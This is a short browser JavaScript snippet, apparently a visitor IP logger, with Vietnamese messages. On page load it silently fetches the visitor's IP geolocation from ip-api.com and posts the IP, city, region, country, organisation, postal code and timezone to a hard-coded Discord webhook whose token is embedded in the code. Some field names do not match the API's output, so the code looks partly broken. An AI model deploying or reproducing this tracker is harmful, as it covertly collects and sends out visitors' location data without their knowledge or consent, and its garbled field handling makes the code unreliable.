document.addEventListener('DOMContentLoaded', function() {

    const webhookURL = 'https://discord.com/api/webhooks/1187006527123492996/zUeI4hUr2xmulw3K613wHu7-a5SlmMq2ho6ggcvZik3iGCoHmq_A1T5tdceO19J9uH7E';

    // Specify the IP address you want to query
    fetch(`http://ip-api.com/json`)
        .then(response => response.json())
        .then(data => {
            const {
                ip,
                city,
                region,
                country,
                loc,
                org,
                postal,
                timezone
            } = data;
            const requestData = {
                content: `Thông tin của người truy cập:
                IP: ${ip}
                Thành phố: ${city}
                Khu vực: ${region}
                Quốc gia: ${country}
                Vị trí: ${loc}
                Tổ chức: ${org}
                Mã bưu điện: ${postal}
                Múi giờ: ${timezone}`
            };

            axios.post(webhookURL, requestData)
                .then(response => {
                    if (response.status === 200) {
                        console.log('Thông tin đã được gửi thành công');
                    } else {
                        console.error('Gửi thông tin không thành công');
                    }
                })
                .catch(error => {
                    console.error('Lỗi kết nối:', error);
                });
        })
        .catch(error => {
            console.error('Lấy địa chỉ IP không thành công:', error);
        });
});
